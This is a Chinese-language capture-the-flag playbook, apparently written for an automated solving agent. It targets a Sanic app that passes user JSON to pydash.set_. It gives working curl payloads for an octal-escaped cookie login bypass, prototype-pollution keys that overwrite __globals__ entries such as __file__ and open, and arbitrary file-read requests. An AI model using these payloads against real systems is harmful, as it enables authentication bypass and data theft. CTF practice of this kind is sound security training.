# PyDash 原型链污染（Sanic + pydash.set_）

> 适用：页面/描述含 **PyDash**、**pydash**、**原型链污染**、**Cookie 八进制绕过**、**parse_path 绕过**。
> 典型路由：`/`、`/src`（源码泄露）、`/login`（cookie 绕过）、`/admin`（JSON pollution）、读 flag。
> 指纹：`Server: Sanic` 或 `/src` 露出 `pydash` 才走本链；否则可能是 Flask 资产系统（切 common-vulnerabilities.md）。

**⚠️ 攻击链速记（.146 实测）**：`/login` 用 cookie `user="adm\073n"`（八进制 `;` 绕过
黑名单 `;`）拿 session → `POST /admin` JSON `{"key":"__class__.__init__.__globals__.__file__","value":"<flag路径>"}`（黑名单只挡 `_.` 子串）→ 读 flag。

> **最短成功链**：`curl /src` 确认 pydash → cookie `\073` 登录 → 污染 `__file__`（上式）→ 读 flag。  
> A 失败再试 §4 的 B/C；禁止 ffuf / security_search 当主链。

## 0. 禁止走偏

- **不要** ffuf/gobuster 目录爆破、`.git` 泄露、常规 LFI 当主链。
- **不要** security_search 猜 payload；按本节逐步验证。
- 镜像内可能没有 pydash 包——在 **solver 容器**里 `pip download pydash` 读 `set_`/`to_path` 源码即可，不必在靶机装包。

## 1. 读源码（30 秒）

```bash
curl -s http://TARGET/src
curl -s http://TARGET/ | head -40
```

确认：`import pydash`、`/admin` 用 `request.json` 的 `key`/`value` 调 `pydash.set_`（或 `set_with`），session 鉴权。

## 2. Cookie 八进制绕过登录

题目过滤 `;`，用八进制 `\073` 代表分号，使 `adm;n` 绕过：

```bash
# user cookie 值：adm + \073 + n  → 服务端 lower 后等于 adm;n
curl -s -i -H 'Cookie: user="adm\073n"' http://TARGET/login
# 期望：login success，Set-Cookie: session=...
```

用同一 session 访问 `/admin`（需带 session cookie）。

## 3. 理解 /admin pollution

典型逻辑（简化）：

```python
# POST /admin  JSON: {"key": "<path>", "value": "<任意>"}
# pydash.set_(obj, key, value)  — key 字符串会被 parse 成 path 数组
```

`403 forbidden` / `200 forbidden` 说明 path 被 WAF/黑名单拦截——换 **parse_path 绕过**（八进制、点段、数组下标混用）。

## 4. parse_path / to_path 绕过（按优先级各试 1 次）

在 solver 容器读 pydash 8.x 行为：

```bash
pip download pydash -d /tmp/pd -q && pip install /tmp/pd/pydash-*.whl -q
python3 - <<'PY'
import inspect, pydash.objects as O, pydash.utilities as U
print(inspect.getsource(U.to_path))
PY
```

常见绕过 key（POST `/admin`，JSON；**A 为实测优先**）：

```bash
TARGET=http://TARGET
SESSION='...'   # 来自 login 的 session cookie

# A) ✅ 实测：污染 __file__（黑名单只挡 '_.' 子串，本 path 可过）
curl -s -X POST "$TARGET/admin" -H "Cookie: session=$SESSION" \
  -H 'Content-Type: application/json' \
  -d '{"key":"__class__.__init__.__globals__.__file__","value":"/flag"}'
# 再 curl /src 或触发读 __file__ 的端点拿 flag

# B) 污染模块级 open/read（A 失败再试）
curl -s -X POST "$TARGET/admin" -H "Cookie: session=$SESSION" \
  -H 'Content-Type: application/json' \
  -d '{"key":"__class__.__init__.__globals__.open","value":"print"}'

# C) 八进制/unicode 混在 path 段（绕过字符串黑名单）
curl -s -X POST "$TARGET/admin" -H "Cookie: session=$SESSION" \
  -H 'Content-Type: application/json' \
  -d '{"key":"__class__\\056\\056init__\\056\\056globals__\\056flag","value":1}'
```

每次 pollution 后访问触发点（如 `/flag`、`/read?file=`、再次 `/src`）看是否读到 flag 内容。

## 5. 任意文件读 → flag

若 pollution 成功改写 `open`/`read_file` 路径或全局 `FLAG_PATH`：

```bash
curl -s -H "Cookie: session=$SESSION" http://TARGET/flag
curl -s -H "Cookie: session=$SESSION" http://TARGET/read?file=/flag
curl -s -H "Cookie: session=$SESSION" http://TARGET/read?file=/challenge/flag.txt
```

**flag 出现在 curl 输出后立即 `challenge_submit_flag`。**

## 6. 失败边界

- 连续 3 种 path 绕过均 `forbidden` → 回读 `/src` 找黑名单函数，针对过滤字（`__globals__`、`os`）换编码。
- 不要换题、不要 multi-port 扫描；本题是单端口 Web 链。
